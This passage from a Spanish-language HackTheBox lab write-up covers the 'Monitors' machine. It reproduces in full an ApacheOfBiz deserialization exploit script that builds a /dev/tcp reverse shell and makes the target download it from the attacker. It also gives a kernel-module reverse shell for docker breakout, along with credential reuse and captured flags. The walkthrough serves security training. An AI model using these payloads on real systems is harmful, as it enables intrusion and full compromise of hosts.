Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.238.
Ncat: Connection from 10.10.10.238:38574.
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ hostname -I
10.10.10.238 172.17.0.1 172.18.0.1 dead:beef::250:56ff:feb9:29a3
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como es de costumbre vamos a conseguir una &lt;code&gt;tty&lt;/code&gt; full interactiva.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;$ script /dev/null -c bash
Script started, file is /dev/null
www-data@monitors:/usr/share/cacti/cacti$ ^Z
zsh: suspended  ncat -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  ncat -nlvp 443
                                reset xterm
www-data@monitors:/usr/share/cacti/cacti$ export TERM=xterm
www-data@monitors:/usr/share/cacti/cacti$ export SHELL=bash
www-data@monitors:/usr/share/cacti/cacti$ stty rows 45 columns 184
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Nos dirigimos al directorio personal del usuario &lt;code&gt;marcus&lt;/code&gt; y vemos que aun no podemos visualizar la &lt;code&gt;flag&lt;/code&gt; como &lt;code&gt;www-data&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@monitors:/home$ cd marcus/
www-data@monitors:/home/marcus$ ls
note.txt  user.txt
www-data@monitors:/home/marcus$ cat user.txt 
cat: user.txt: Permission denied
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como tenemos un servicio &lt;code&gt;cacti&lt;/code&gt; vamos a tratar de filtrar desde la raiz archivos que contengan la palabra &lt;code&gt;cacti&lt;/code&gt; y encontramos una ruta con un archivo &lt;code&gt;cacti-backup-service&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@monitors:/home/marcus$ find / -name \*cacti\* 2&amp;gt;/dev/null
/etc/apache2/sites-available/cacti-admin.monitors.htb.conf
/etc/apache2/sites-enabled/cacti-admin.monitors.htb.conf
/etc/systemd/system/cacti-backup.service
/lib/systemd/system/cacti-backup.service
/var/log/cacti-access.log
/var/log/cacti-error.log
/var/lib/apache2/site/enabled_by_admin/cacti-admin.monitor.htb
/var/lib/apache2/site/enabled_by_admin/cacti-admin.monitors.htb
/usr/share/cacti
/usr/share/cacti/cacti
/usr/share/cacti/cacti/log/cacti.log
/usr/share/cacti/cacti/locales/po/cacti.pot
/usr/share/cacti/cacti/scripts/cacti_user_stats.php
/usr/share/cacti/cacti/include/cacti_version
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Leemos el archivo y dentro nos muestra que dentro del directorio oculto &lt;code&gt;.backup&lt;/code&gt; se encuentra un archivo &lt;code&gt;backup.sh&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@monitors:/home/marcus$ cat /etc/systemd/system/cacti-backup.service 
[Unit]
Description=Cacti Backup Service
After=network.target

[Service]
Type=oneshot
User=www-data
ExecStart=/home/marcus/.backup/backup.sh

[Install]
WantedBy=multi-user.target
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Leemos el archivo &lt;code&gt;backup.sh&lt;/code&gt; y encontramos unas credenciales.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@monitors:/home/marcus$ cat /home/marcus/.backup/backup.sh
#!/bin/bash

backup_name=&quot;cacti_backup&quot;
config_pass=&quot;VerticalEdge2020&quot;

zip /tmp/${backup_name}.zip /usr/share/cacti/cacti/*
sshpass -p &quot;${config_pass}&quot; scp /tmp/${backup_name} 192.168.1.14:/opt/backup_collection/${backup_name}.zip
rm /tmp/${backup_name}.zip
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Probamos la contraseña y podemos convertirnos en el usuario &lt;code&gt;marcus&lt;/code&gt; y ahora si podemos visualizar la primera flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@monitors:/home/marcus$ su marcus
Password: 
marcus@monitors:~$ whoami
marcus
marcus@monitors:~$ cat /home/marcus/user.txt 
055c999cf2967582c6bd59b2cd7fd44f
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Enumerando el sistema al lista los puertos abiertos en la maquina, vemos un puerto curioso &lt;code&gt;8443&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;marcus@monitors:~$ netstat -nat
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:8443          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp        0      1 10.10.10.238:59308      1.1.1.1:53              SYN_SENT   
tcp        0    138 10.10.10.238:38574      10.10.16.3:443          ESTABLISHED
tcp6       0      0 :::22                   :::*                    LISTEN     
tcp6       0      0 :::80                   :::*                    LISTEN     
tcp6       1      0 10.10.10.238:80         10.10.16.3:38872        CLOSE_WAIT
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Para poder tener acceso a el desde nuestra maquina, nos conectaremos como el usuario &lt;code&gt;marcus&lt;/code&gt; por el servicio &lt;code&gt;ssh&lt;/code&gt;, que si recordamos estaba abierto y aplicaremos un &lt;code&gt;local port forwarding&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ssh marcus@10.10.10.238 -L 8443:127.0.0.1:8443
marcus@10.10.10.238's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-151-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun May 14 22:16:22 UTC 2023

  System load:  0.08               Users logged in:                0
  Usage of /:   34.9% of 17.59GB   IP address for ens160:          10.10.10.238
  Memory usage: 46%                IP address for docker0:         172.17.0.1
  Swap usage:   0%                 IP address for br-968a1c1855aa: 172.18.0.1
  Processes:    189

 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

128 packages can be updated.
97 of these updates are security updates.
To see these additional updates run: apt list --upgradable

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sun May 14 22:13:41 2023 from 10.10.16.3
marcus@monitors:~$ 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Verificamos que tenemos conexion al puerto.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ lsof -i:8443
COMMAND   PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
ssh     66347 root    4u  IPv6 258489      0t0  TCP localhost:8443 (LISTEN)
ssh     66347 root    5u  IPv4 258490      0t0  TCP localhost:8443 (LISTEN)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Veamos el servicio desde nuestro navegador.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Monitors/moni5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nos arroja el codigo de estado &lt;code&gt;404 not found&lt;/code&gt;. Ahora trataremos con &lt;code&gt;wfuzz&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ wfuzz -c --hc=404 -t 150 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt https://127.0.0.1:8443/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://127.0.0.1:8443/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                               
=====================================================================

000000016:   302        0 L      0 W        0 Ch        &quot;images&quot;                                                                                                              
000000075:   302        0 L      0 W        0 Ch        &quot;content&quot;                                                                                                             
000000152:   302        0 L      0 W        0 Ch        &quot;common&quot;                                                                                                              
000000242:   302        0 L      0 W        0 Ch        &quot;catalog&quot;                                                                                                             
000000564:   302        0 L      0 W        0 Ch        &quot;marketing&quot;                                                                                                           
000000779:   302        0 L      0 W        0 Ch        &quot;ecommerce&quot;                                                                                                           
000000920:   302        0 L      0 W        0 Ch        &quot;ap&quot;                                                                                                                  
000001128:   302        0 L      0 W        0 Ch        &quot;ar&quot;                                                                                                                  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vemos varias rutas que nos dan un codigo de estado &lt;code&gt;302 redirect&lt;/code&gt;, y si provamos con la ruta &lt;code&gt;ecommerce&lt;/code&gt;, en el navegador vemos algo relacionado a &lt;code&gt;ofbizsetup&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Monitors/moni6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como sabemos se esta usando el servicio de &lt;code&gt;apache&lt;/code&gt; asi que podemos tratar de buscar vulnerabilidades asociadas a &lt;code&gt;apacheofbiz&lt;/code&gt; y encontramos una de &lt;code&gt;RCE&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ searchsploit apacheofbiz
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                       |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
ApacheOfBiz 17.12.01 - Remote Command Execution (RCE)                                                                                                | java/webapps/50178.sh
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Examinamos el &lt;code&gt;exploit&lt;/code&gt; y vemos que aprovecha una vulnerabilidad de serealizacion.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;# Exploit Title: ApacheOfBiz 17.12.01 - Remote Command Execution (RCE) via Unsafe Deserialization of XMLRPC arguments
# Date: 2021-08-04
# Exploit Author: Álvaro Muñoz, Adrián Díaz (s4dbrd)
# Vendor Homepage: https://ofbiz.apache.org/index.html
# Software Link: https://archive.apache.org/dist/ofbiz/apache-ofbiz-17.12.01.zip
# Version: 17.12.01
# Tested on: Linux

# CVE : CVE-2020-9496

# Step 1: Host HTTP Service with python3 (sudo python3 -m http.server 80)
# Step 2: Start nc listener (Recommended 8001).
# Step 3: Run the exploit.


url='https://127.0.0.1' # CHANGE THIS
port=8443 # CHANGE THIS

function helpPanel(){
    echo -e &quot;\nUsage:&quot;
    echo -e &quot;\t[-i] Attacker's IP&quot;
    echo -e &quot;\t[-p] Attacker's Port&quot;
    echo -e &quot;\t[-h] Show help pannel&quot;
    exit 1
}


function ctrl_c(){
    echo -e &quot;\n\n[!] Exiting...\n&quot;
    exit 1
}
# Ctrl + C
trap ctrl_c INT

function webRequest(){
    echo -e &quot;\n[*] Creating a shell file with bash\n&quot;
    echo -e &quot;#!/bin/bash\n/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/$ip/$ncport 0&amp;gt;&amp;amp;1&quot; &amp;gt; shell.sh
    echo -e &quot;[*] Downloading YsoSerial JAR File\n&quot;
    wget -q https://jitpack.io/com/github/frohoff/ysoserial/master-d367e379d9-1/ysoserial-master-d367e379d9-1.jar
    echo -e &quot;[*] Generating a JAR payload\n&quot;
    payload=$(java -jar ysoserial-master-d367e379d9-1.jar CommonsBeanutils1 &quot;wget $ip/shell.sh -O /tmp/shell.sh&quot; | base64 | tr -d &quot;\n&quot;)
    echo -e &quot;[*] Sending malicious shell to server...\n&quot; &amp;amp;&amp;amp; sleep 0.5
    curl -s $url:$port/webtools/control/xmlrpc -X POST -d &quot;&amp;lt;?xml version='1.0'?&amp;gt;&amp;lt;methodCall&amp;gt;&amp;lt;methodName&amp;gt;ProjectDiscovery&amp;lt;/methodName&amp;gt;&amp;lt;params&amp;gt;&amp;lt;param&amp;gt;&amp;lt;value&amp;gt;&amp;lt;struct&amp;gt;&amp;lt;member&amp;gt;&amp;lt;name&amp;gt;test&amp;lt;/name&amp;gt;&amp;lt;value&amp;gt;&amp;lt;serializable xmlns='http://ws.apache.org/xmlrpc/namespaces/extensions'&amp;gt;$payload&amp;lt;/serializable&amp;gt;&amp;lt;/value&amp;gt;&amp;lt;/member&amp;gt;&amp;lt;/struct&amp;gt;&amp;lt;/value&amp;gt;&amp;lt;/param&amp;gt;&amp;lt;/params&amp;gt;&amp;lt;/methodCall&amp;gt;&quot; -k  -H 'Content-Type:application/xml' &amp;amp;&amp;gt;/dev/null
    echo -e &quot;[*] Generating a second JAR payload&quot;
    payload2=$(java -jar ysoserial-master-d367e379d9-1.jar CommonsBeanutils1 &quot;bash /tmp/shell.sh&quot; | base64 | tr -d &quot;\n&quot;)
    echo -e &quot;\n[*] Executing the payload in the server...\n&quot; &amp;amp;&amp;amp; sleep 0.5
    curl -s $url:$port/webtools/control/xmlrpc -X POST -d &quot;&amp;lt;?xml version='1.0'?&amp;gt;&amp;lt;methodCall&amp;gt;&amp;lt;methodName&amp;gt;ProjectDiscovery&amp;lt;/methodName&amp;gt;&amp;lt;params&amp;gt;&amp;lt;param&amp;gt;&amp;lt;value&amp;gt;&amp;lt;struct&amp;gt;&amp;lt;member&amp;gt;&amp;lt;name&amp;gt;test&amp;lt;/name&amp;gt;&amp;lt;value&amp;gt;&amp;lt;serializable xmlns='http://ws.apache.org/xmlrpc/namespaces/extensions'&amp;gt;$payload2&amp;lt;/serializable&amp;gt;&amp;lt;/value&amp;gt;&amp;lt;/member&amp;gt;&amp;lt;/struct&amp;gt;&amp;lt;/value&amp;gt;&amp;lt;/param&amp;gt;&amp;lt;/params&amp;gt;&amp;lt;/methodCall&amp;gt;&quot; -k  -H 'Content-Type:application/xml' &amp;amp;&amp;gt;/dev/null
    echo -e &quot;\n[*]Deleting Files...&quot;
    rm ysoserial-master-d367e379d9-1.jar &amp;amp;&amp;amp; rm shell.sh
}

declare -i parameter_enable=0; while getopts &quot;:i:p:h:&quot; arg; do
    case $arg in
        i) ip=$OPTARG; let parameter_enable+=1;;
        p) ncport=$OPTARG; let parameter_enable+=1;;
        h) helpPanel;;
    esac
done

if [ $parameter_enable -ne 2 ]; then
    helpPanel
else
    webRequest
fi
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ejecutamos el &lt;code&gt;exploit&lt;/code&gt; nos pide como parametros nuestra ip de atacante y un puerto especifico.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ bash ofbiz.sh

Usage:
	[-i] Attacker's IP
	[-p] Attacker's Port
	[-h] Show help pannel
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Nos compartimos un servicio web con &lt;code&gt;python3&lt;/code&gt; ya que el &lt;code&gt;exploit&lt;/code&gt; hara una petición a nuestra maquina solicitando un archivo de nombre &lt;code&gt;shell.sh&lt;/code&gt; el cual previamente creara y con el cual nos devolvera una conexion al puerto que le especificamos. Seguidamente nos pondremos en escucha con &lt;code&gt;ncat&lt;/code&gt; y lanzamos el &lt;code&gt;exploit&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ bash ofbiz.sh -i 10.10.16.3 -p 443

[*] Creating a shell file with bash

[*] Downloading YsoSerial JAR File

[*] Generating a JAR payload

[*] Sending malicious shell to server...

[*] Generating a second JAR payload

[*] Executing the payload in the server...


[*]Deleting Files...
❯ cat ofbiz.sh
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Recibimos la petición.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.238 - - [14/May/2023 22:43:38] &quot;GET /shell.sh HTTP/1.1&quot; 200 -
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;y ganamos acceso, pero a un contenedor.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.238.
Ncat: Connection from 10.10.10.238:40592.
bash: cannot set terminal process group (32): Inappropriate ioctl for device
bash: no job control in this shell
root@b097fc57960e:/usr/src/apache-ofbiz-17.12.01# whoami
whoami
root
root@b097fc57960e:/usr/src/apache-ofbiz-17.12.01# hostname -I
hostname -I
172.17.0.2 
root@b097fc57960e:/usr/src/apache-ofbiz-17.12.01#
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;Escalada de Privilegios &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Haremos el mismo proceso anterior para obtener una &lt;code&gt;tty full interactive&lt;/code&gt;. Lo siguiente que haremos sera descargarnos el &lt;code&gt;linpeas.sh&lt;/code&gt; del repositorio de &lt;code&gt;carlospolop&lt;/code&gt; y subirlo al contenedor para buscar formas potenciales de elevar nuestro privilegio.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;root@b097fc57960e:/tmp# wget http://10.10.16.3/linpeas.sh
--2023-05-14 22:54:08--  http://10.10.16.3/linpeas.sh
Connecting to 10.10.16.3:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 835306 (816K) [text/x-sh]
Saving to: ‘linpeas.sh’
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Le damos permiso al archivo y lo ejecutamos.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;root@b097fc57960e:/tmp# chmod +x linpeas.sh 
root@b097fc57960e:/tmp# ./linpeas.sh
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Despues de esperar a que nos haga un reconocimento, nos reporta algo potencial referente a una capability &lt;code&gt;sys_module&lt;/code&gt; con la cual podemos convertirnos en &lt;code&gt;root&lt;/code&gt; en la maquina real.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;╔══════════╣ Container Capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#capabilities-abuse-escape
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+eip
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si quieres saber mas al respecto puedes guiarte de este articulo.&lt;/p&gt;

&lt;p&gt;*&lt;a href=&quot;https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd&quot;&gt;https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Lo primero que debemos hacer es crear un archivo &lt;code&gt;reverse-shell.c&lt;/code&gt; con un contenido especifico, donde podemos cambiar la &lt;code&gt;ip y puerto&lt;/code&gt; en el cual deseamos recibir la conexión, en este caso yo realizare la conexión en la interface &lt;code&gt;docker&lt;/code&gt; del usuario &lt;code&gt;marcus&lt;/code&gt; la cual corresponde a la &lt;code&gt;172.17.0.1&lt;/code&gt; y en cuanto al puerto usare el que esta por defecto &lt;code&gt;4444&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;#include &amp;lt;linux/kmod.h&amp;gt;
#include &amp;lt;linux/module.h&amp;gt;
MODULE_LICENSE(&quot;GPL&quot;);
MODULE_AUTHOR(&quot;AttackDefense&quot;);
MODULE_DESCRIPTION(&quot;LKM reverse shell module&quot;);
MODULE_VERSION(&quot;1.0&quot;);
char* argv[] = {&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;bash -i &amp;gt;&amp;amp; /dev/tcp/172.17.0.1/4444 0&amp;gt;&amp;amp;1&quot;, NULL};
static char* envp[] = {&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;, NULL };
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}
static void __exit reverse_shell_exit(void) {
printk(KERN_INFO &quot;Exiting\n&quot;);
}
module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Seguidamente crearemos un archivo &lt;code&gt;makefile&lt;/code&gt; con otro contenido especifico.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;obj-m +=reverse-shell.o
all:
        make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
clean:
        make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Despues ejecutaremos un &lt;code&gt;make&lt;/code&gt; para compilarlo, este nos creara un archivo &lt;code&gt;.ko&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;root@b097fc57960e:/tmp# make
make -C /lib/modules/4.15.0-151-generic/build M=/tmp modules
make[1]: Entering directory '/usr/src/linux-headers-4.15.0-151-generic'
  CC [M]  /tmp/reverse-shell.o
  Building modules, stage 2.
  MODPOST 1 modules
  CC      /tmp/reverse-shell.mod.o
  LD [M]  /tmp/reverse-shell.ko
make[1]: Leaving directory '/usr/src/linux-headers-4.15.0-151-generic'
root@b097fc57960e:/tmp# ls
Makefile		      gradle2795579439185181258.bin  gradle6644211106987001499.bin  gradle9039635524913268865.bin  hsperfdata_root  reverse-shell.ko	 shell.sh
Module.symvers		      gradle2983053951583899525.bin  gradle7006611085073049553.bin  gradle9084471384540617701.bin  linpeas.sh	    reverse-shell.mod.c
gradle1338051207622881975.bin  gradle3783653524079408204.bin  gradle7211342044412775236.bin  gradle9170701421662864177.bin  modules.order    reverse-shell.mod.o
gradle251280844494394051.bin   gradle4550055017114582402.bin  gradle8316659095765584843.bin  gradle984417515461424419.bin   reverse-shell.c  reverse-shell.o
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;finalmente debemos ponernos en escucha en el puerto especifico con &lt;code&gt;ncat&lt;/code&gt; y ejecutar el &lt;code&gt;reverse-shell.ko&lt;/code&gt; con &lt;code&gt;insmod&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;root@b097fc57960e:/tmp# insmod reverse-shell.ko 
root@b097fc57960e:/tmp#
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;y recibimos la conexión como &lt;code&gt;root&lt;/code&gt; en la maquina real.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;marcus@monitors:~$ nc -nlvp 4444
Listening on [0.0.0.0] (family 0, port 4444)
Connection from 10.10.10.238 36840 received!
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
root@monitors:/# whoami
whoami
root
root@monitors:/# hostname -I
hostname -I
10.10.10.238 172.17.0.1 172.18.0.1 dead:beef::250:56ff:feb9:29a3
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lo que nos queda ahora es ir al directorio personal del usuario &lt;code&gt;root&lt;/code&gt; y visualizar la segunda flag &lt;code&gt;root.txt&lt;/code&gt; 😄.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;root@monitors:/# cd /root
cd /root
root@monitors:/root# cat root.txt
cat root.txt
9f3208a5ff66eb9a612aaba91ea35eae
&lt;/code&gt;&lt;/pre&gt;

</description>
        <pubDate>Sun, 14 May 2023 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/hackthebox/htb-writeup-Monitors</link>
        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Monitors</guid>
        
        <category>Information Leaked</category>
        
        <category>Wordpress Plugin Explotation</category>
        
        <category>LFI</category>
        
        <category>Cacti Explotation</category>
        
        <category>Deserialization Attack</category>
        
        <category>Docker Breakout</category>
        
        <category>capability sysmodule</category>
        
        
        <category>hackthebox</category>
        
      </item>
    
  </channel>
</rss>
